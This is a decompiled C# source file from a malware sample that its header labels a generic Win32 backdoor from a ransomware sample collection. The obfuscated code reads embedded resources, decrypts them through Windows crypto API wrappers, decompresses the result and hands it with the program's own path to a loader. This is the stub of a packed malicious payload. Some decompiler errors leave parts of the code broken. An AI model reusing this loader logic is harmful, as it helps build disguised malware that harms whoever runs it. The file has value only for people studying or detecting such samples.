// Decompiled with JetBrains decompiler
// Type: %IEW1W).#)V&.^
// Assembly: WI-, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 39C1D42E-5B95-445C-A616-1A2ECFEC41CE
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-ee6c98579799200a7b6cdc1ce77a6984ce5c34b633b9fbda225db62f194a61a2.exe

using \u0025\u001CIEW1W\u0029.\u0023\u0019\u0029\u0016\u0016\u0084V\u0026;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0025\u001CIEW1W\u0029.\u0023\u0019\u0029\u0016\u0016\u0084V\u0026
{
  internal class \u005E\u001D
  {
    private const uint \u0023\u003C\u0010H\u0010\u0026\u0095\u0011 = 4;
    private const uint \u001A\u0017\u0008\u0006\u000B9I\u001Fd = 24;
    private const uint \u001C\u002A\u0021\u0025\u0002 = 8;
    private const uint \u000B\u0005\u000E = 2;

    public static void OO\u0008\u0027a\u0090I\u002E\u003C(object _param0)
    {
      byte[] numArray1 = new byte[0];
      byte[] numArray2 = new byte[0];
      \u005E\u001D.\u0018\u0008\u0014l\u002D(ref numArray1, (IntPtr) 1);
      int num = 2;
      while (\u005E\u001D.\u0018\u0008\u0014l\u002D(ref numArray2, (IntPtr) num))
        ++num;
      E\u0011K\u0016c\u0080\u0006.\u003CpQ\u008B\u00A1\u008C9J(\u005E\u001D.SS\u002E\u0012\u0017(numArray1, numArray2), \u005E\u001D.\u0029C\u0006P\u0098\u000E(), (string[]) _param0);
      \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u003Fm.kl\u0021O\u0010C\u001E(0U);
    }

    private static bool \u0018\u0008\u0014l\u002D(ref byte[] _param0, IntPtr _param1)
    {
      try
      {
        IntPtr num1 = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u003Fm.\u0018K(IntPtr.Zero, _param1, (IntPtr) 4L);
        IntPtr num2 = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u003Fm.\u0031\u0013\u0025(IntPtr.Zero, num1);
        IntPtr source = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u003Fm.E\u0026\u0023\u000D\u008A(num2);
        uint length = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u003Fm.\u001575(IntPtr.Zero, num1);
        Array.Resize<byte>(ref _param0, _param0.Length + (int) length);
        Marshal.Copy(source, _param0, _param0.Length - (int) length, (int) length);
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static uint J\u0023X2Q\u005D(byte[] _param0, ref byte[] _param1)
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      uint length = (uint) _param1.Length;
      if (!\u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u0022\u001FTu\u001D\u0019\u0004\u0012\u000F.\u0020\u0020\u001C\u0013\u000C\u0024\u0016\u0006M(ref zero1, IntPtr.Zero, IntPtr.Zero, 24U, 0U))
      {
        int num1 = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u0022\u001FTu\u001D\u0019\u0004\u0012\u000F.\u0020\u0020\u001C\u0013\u000C\u0024\u0016\u0006M(ref zero1, IntPtr.Zero, IntPtr.Zero, 24U, 8U) ? 1 : 0;
      }
      int num2 = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u0022\u001FTu\u001D\u0019\u0004\u0012\u000F.\u003EE\u001C(zero1, _param0, (uint) _param0.Length, IntPtr.Zero, 0U, out zero2) ? 1 : 0;
      int num3 = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u0022\u001FTu\u001D\u0019\u0004\u0012\u000F.\u001D\u0006\u007D(zero2, IntPtr.Zero, 1, 0U, _param1, ref length) ? 1 : 0;
      return length;
    }

    private static unsafe IntPtr SS\u002E\u0012\u0017(byte[] _param0, byte[] _param1)
    {
      uint num1 = 0;
      uint num2 = \u005E\u001D.J\u0023X2Q\u005D(_param0, ref _param1);
      byte[] numArray = new byte[(int) ((double) num2 * 12.5)];
      fixed (byte* numPtr = &_param1[0])
        ;
      fixed (byte* numPtr = &numArray[0])
        ;
      // ISSUE: fixed variable is out of scope
      // ISSUE: fixed variable is out of scope
      int num3 = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.\u003C\u0010\u0021\u001A\u000F(2U, (IntPtr) (void*) numPtr, (uint) numArray.Length, (IntPtr) (void*) numPtr, num2, out num1) ? 1 : 0;
      // ISSUE: fixed variable is out of scope
      return (IntPtr) (void*) numPtr;
    }

    private static string \u0029C\u0006P\u0098\u000E()
    {
      byte[] bytes = new byte[(int) byte.MaxValue];
      int num = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u003Fm.\u009D\u0017R\u0011\u00030\u0026J(IntPtr.Zero, bytes, bytes.Length) ? 1 : 0;
      return Encoding.Unicode.GetString(bytes);
    }
  }
}
